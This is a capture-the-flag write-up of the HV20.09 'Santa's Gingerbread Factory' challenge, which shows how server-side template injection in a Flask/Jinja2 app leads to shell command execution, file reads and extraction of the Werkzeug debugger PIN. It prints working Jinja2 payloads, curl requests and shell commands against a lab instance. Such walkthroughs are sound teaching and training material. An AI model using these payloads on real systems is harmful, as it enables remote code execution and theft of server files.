# HV20.09 Santa's Gingerbread Factory

<img src="../_resources/06_penetration_testing.png" style="height:1.8em;vertical-align:middle;">
<img src="../_resources/01_web_security.png" style="height:1.8em;vertical-align:middle;">
<img src="../_resources/medium.png" style="height:1.8em;vertical-align:middle;">  

---

## Introduction
Here you can customize your absolutely fat-free gingerbread man.

**Note:** Start your personal instance from the `RESOURCES` section on top.

### Mission

Besides the gingerbread men, there are other goodies there. Let's see if you can get the goodie, which is stored in `/flag.txt`.

---

## Analysis

Todays medium level challenge is classified as "Penetration Testing", "Web Security". We can start our personal instance as part of the challenge:
`https://8ea11899-6ff8-4b13-bc23-5e011061048c.idocker.vuln.land`.

To get an idea of the site, check out [index.html](site/index.html) (**be aware**: the copied form is not functional here!). It is basically a site showing a gingerbread man where we can customize the eyes/head and provide a name for the text bubble.

From looking at the responses header the server is identifying as `Werkzeug/1.0.1 Python/2.7.16`. So we will google for "Python 2.7.16 vulnerabilities":

- CVE-2019-9948 (6.4/10): "Bypass"

      urllib in Python 2.x through 2.7.16 supports the local_file: scheme, which makes it easier for remote attackers to bypass protection mechanisms that blacklist file: URIs, as demonstrated by triggering a urllib.urlopen('local_file:///etc/passwd') call.

- CVE-2019-9636 (5.0/10):

      Python 2.7.x through 2.7.16 and 3.x through 3.7.2 is affected by: **Improper Handling of Unicode Encoding** (with an incorrect netloc) during NFKC normalization. The impact is: Information disclosure (credentials, cookies, etc. that are cached against a given hostname). The components are: **urllib.parse.urlsplit, urllib.parse.urlparse**. The attack vector is: A specially crafted URL could be incorrectly parsed to locate cookies or authentication data and send that information to a different host than when parsed correctly.

- CVE-2018-20852 (5.0/10):

      http.cookiejar.DefaultPolicy.domain_return_ok in Lib/http/cookiejar.py in Python before 3.7.3 does not correctly validate the domain: it can be tricked into sending existing cookies to the wrong server. An attacker may abuse this flaw by using a server with a hostname that has another valid hostname as a suffix (e.g., pythonicexample.com to steal cookies for example.com). When a program uses http.cookiejar.DefaultPolicy and tries to do an HTTP connection to an attacker-controlled server, existing cookies can be leaked to the attacker. This affects 2.x through 2.7.16, 3.x before 3.4.10, 3.5.x before 3.5.7, 3.6.x before 3.6.9, and 3.7.x before 3.7.3.

- CVE-2019-9947 (4.3/10):

      An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. **CRLF injection is possible if the attacker controls a url parameter**, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the path component of a URL that lacks a ? character) followed by an HTTP header or a Redis command. This is similar to the CVE-2019-9740 query string issue.

- CVE-2019-9740 (4.3/10):

      An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the query string after a ? character) followed by an HTTP header or a Redis command.


The `CVE-2019-9948` "Bypass" vulnerability would be good to access the URL `/flag.txt`. The question is whether we do have somewhere an URL which can be influenced by our request.

After playing around with the parameters in Postman, I had to hit the HackVent Discord channel to get a hint. "Werkzeug 1.0.1" really seems to be a tool 😉. Sadly, "Werkzeug 1.0.1" does not have known vulnerabilities. So have to look into how web sites using this tool are use implemented and used, so we can possibly exploit a vulnerability of Python below it.

After reading through the Werkzeug tutorial. I saw potential to exploit the open Python vulnerabilities (e.g. urlparse.urlparse and redis was used in the example). The problem is now: How much is the "Gingerbread man" influenced by this simple tutorial. So far I found only the "/" URL working with the parameters in the body (=only POST not GET parameters).

According to another hint from Seb on Discord, I should look into the environment where "Werkzeug" is used. According to the documentation, this is in "Flask". Looking for "flask vulnerabilities" I found a description [here](https://medium.com/bugbountywriteup/angstromctf-2018-web-writeups-part-2-6c1ee586aa64) where it is explained that if flask is running it may execute code in double curly-braces, e.g. "{{7*7}}". I tested this on our gingerbread man "name" parameter and it was executed! 🥳🍾

Further, if "{{7*'7'}}" results in "7777777", Twig or Jinja2 is in use. By providing some invalid input (like a ` character), we get an error message screen from Jinja2.

So we will now try to exploit this environment!

### Try 1

**Input:**

    name = {{urllib.urlopen('local_file:///etc/passwd')}}

**Error:**

    jinja2.exceptions.UndefinedError

    UndefinedError: 'urllib' is undefined


The error message leaked parts of `/opt/app/app.py`:

```python
@app.route('/', methods=["POST", "GET"])
def main(eyes="*", name="Hacker"):
  eyes = request.form.get('eyes', "*")
  name = request.form.get('name', "Hacker")

  text = Environment(loader=BaseLoader()).from_string("Hello, mighty " + name).render()
  print("Text: " + text)
  t = wrap(text, width=30)
  l = 0;
  for line in t:
    if len(line) > l:
```

(The [full source code](app.py) has been recovered after successfully solving the challenge.)


### Try 2

Trying to know what is "available":

**Input:**

    name = {{self.__dict__}}

**Output:**

    {
        '_TemplateReference__context': <Context
            {
                'range': <type 'xrange'>,
                'dict': <type 'dict'>,
                'cycler': <class 'jinja2.utils.Cycler'>,
                'joiner': <class 'jinja2.utils.Joiner'>,
                'namespace': <class 'jinja2.utils.Namespace'>,
                'lipsum': <function generate_lorem_ipsum at 0x7f56b3127050>
            }
        of None>
    }

Executing the lipsum function:

    {{self._TemplateReference__context.lipsum()}}


Nothing special: Lorep Ipsum... a template filling text.

### Further research

I found the article [SSTI in Flask/Jinja2](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee).

So I try: `{{ ''.__class__.__mro__ }}` to find the `object` class. And `{{ ''.__class__.__mro__[2].__subclasses__() }}` to find all its subclasses and look for `subprocess.Popen`.

**Input:**

    {{ ''.__class__.__mro__[2].__subclasses__() }}

**Output:**

  An array of 311 objects (see [`python_mro.txt`](python_mro.txt)).
  As we care about `subprocess.Popen` we find index 258 as the relevant to continue our exploit development.

---

Now we have access to execute shell commands.

**Input:**

    {{ ''.__class__.__mro__[2].__subclasses__()[258]('ls /',shell=True).stdout}}

**Output:**

It seems to be running, but no output is generated... The `stdout` object is "None". This might be because the process is running in parallel and it has not yet been initialized (_this is a wrong assumption_).

So I try the `wait()` command to ensure that the child process is being waited on.

**Input:** for `ls /flag.txt`

    {{ ''.__class__.__mro__[2].__subclasses__()[258]('ls /flag.txt',shell=True).wait()}}

But doing this, we only get the return code of the child process. We can verify that the file exists at `/flag.txt`: return value is 0. If the file would not exist, the value would be 2.

But the problem of using `wait()` is: The output is lost, as we cannot access the `Popen` object anymore. (If we had Python statements and not Python expressions available, this wouldn't be a problem.)

---

Checking the Python documentation for `Popen` indicates that we should set the parameter `stdout` to `PIPE` to be able to read the output. Sadly, the `PIPE` value is not accepted. After checking the [Pyton implementation](https://github.com/python/cpython/blob/master/Lib/subprocess.py) of `subprocess`, I saw that I can pass in `-1` to get the output piped.

## Solution

With this knowledge we can now read the flag using `cat /flag.txt`:

    {{ ''.__class__.__mro__[2].__subclasses__()[258]('cat /flag.txt', stdout=-1, shell=True).stdout.read()}}

we get the flag shown in the output:

    HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}

## Alternate approach: Read the file directly

Thanks to brp64 to pointing me to the site [Flask & Jinja2 SSTI Cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti), I learned about a much easier method to access the flags content: Open the file for reading.

This can be done with the following input:

    {{"".__class__.mro()[2].__subclasses__()[40]('/flag.txt', 'r').read()}}


## Alternate approach: Find the PIN for the built in debugger shell

In the Discord channel were discussions about getting the "Werkzeug" debugger shell (which is shown when ever an exception occured) could be accessed.
Currently it is protected with a PIN. According to discussions, the PIN is not stored in the filesystem and the corresponding environment variable `WERKZEUG_DEBUG_PIN` is not set or it is not readable from our Flask process.

A hint from Wurzel was intriguing: try to access `werkzeug.debug.get_pin_and_cookie_name`.

Therefore I was looking into further interesting classes (beside `subprocess.Popen`) and found one: `werkzeug.debug.DebuggedApplication`

Let's explore whether we can solve the challenge using this object.

Getting all its properties/functions

    {{ ''.__class__.__mro__[2].__subclasses__()[304].__dict__}}

    {{ ''.__class__.__mro__[2].__subclasses__()[304].pin()

Does not work. We need an instance of `DebuggedApplication`...

But perhaps we can climb from our `self` to some global object?

    {{ self._TemplateReference__context.environment.__dict__ }}


A hint from wurzel did indicate how the solution would look like:

    URL=https://your.idocker.vuln.land/
    curl -X POST $URL -d "name={{[].class.base.subclasses()[258](["echo from flask import Flask;import werkzeug.debug;app = Flask(name);print(werkzeug.debug.get_pin_and_cookie_name(app)) >/tmp/test"], shell=True)}}"
    curl -X POST $URL -d "name={{[].class.base.subclasses()[258](["python /tmp/test > /tmp/test1 2>/tmp/test2"], shell=True)}}"
    curl -X POST $URL -d "name={{[].class.base.subclasses()[40]("/tmp/test1").read()}}"

I couldn't execute it as it was... Perhaps this `class`, `base` and `subclasses` was some Python3 stuff. So I could adapt the necessary `name` inputs:

    {{ ''.__class__.__mro__[2].__subclasses__()[258](['echo "from flask import Flask;import werkzeug.debug;app = Flask(\"name\");print(werkzeug.debug.get_pin_and_cookie_name(app))" >/tmp/test && echo "OK"'], shell=True, stdout=-1, stderr=-1).stdout.read()}}

    {{ ''.__class__.__mro__[2].__subclasses__()[258](["python /tmp/test > /tmp/test1 2>/tmp/test2"], shell=True, stdout=-1, stderr=-1).stderr.read()}}

    {{"".__class__.mro()[2].__subclasses__()[40]('/tmp/test1', 'r').read()}}


But there is an execution problem (which can be read from `test2`, the error file:

    {{"".__class__.mro()[2].__subclasses__()[40]('/tmp/test1', 'r').read()}}

---

    Traceback (most recent call last):

    File "/tmp/test", line 1, in <module>
    from flask import Flask;import werkzeug.debug;app = Flask(name);print(werkzeug.debug.get_pin_and_cookie_name(app))

    NameError: name 'name' is not defined

This indicates that the file could not be properly created (probably some ' or " were lost due to shell command parsing).

So I wrote the [`v3_app.py`](v3_app.py) locally and base64 encoded it. 

I then used the following commands to create the `/tmp/test0` file and decrypt it on the server:

    {{ ''.__class__.__mro__[2].__subclasses__()[258](['echo "ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2sKaW1wb3J0IHdlcmt6ZXVnLmRlYnVnCmFwcCA9IEZsYXNrKCJuYW1lIikKcHJpbnQod2Vya3pldWcuZGVidWcuZ2V0X3Bpbl9hbmRfY29va2llX25hbWUoYXBwKSkK" >/tmp/test0 && echo "OK"'], shell=True, stdout=-1, stderr=-1).stdout.read()}}

    {{ ''.__class__.__mro__[2].__subclasses__()[258](['base64 -d /tmp/test0 > /tmp/test && echo "OK"'], shell=True, stdout=-1, stderr=-1).stdout.read()}}

Execute the app and display the debugger PIN:

    {{ ''.__class__.__mro__[2].__subclasses__()[258](["python /tmp/test 2>/tmp/test2"], shell=True, stdout=-1).stdout.read()}}

Cleanup the server, removing the `/tmp/test*` files:
    
    {{ ''.__class__.__mro__[2].__subclasses__()[258](["rm /tmp/test*"], shell=True, stdout=-1, stderr=-1).stderr.read()}}


With the PIN available, we have to open the debugger console. 

The easiest way is to open the console by accessing the `/console` address: https://XYZ.idocker.vuln.land/console

Alternatively you can cause an error by sending the input `ä` to the site. This leads to a crash where we can click on the `terminal` symbol on the right side of a line of source code and provide the PIN to startup the console:

![enter-pin.png](enter-pin.png)

![debugger-console.png](debugger-console.png)


Here we can enter "regular Python" to read the `/flag.txt`:

    open('/flag.txt', 'r').read()

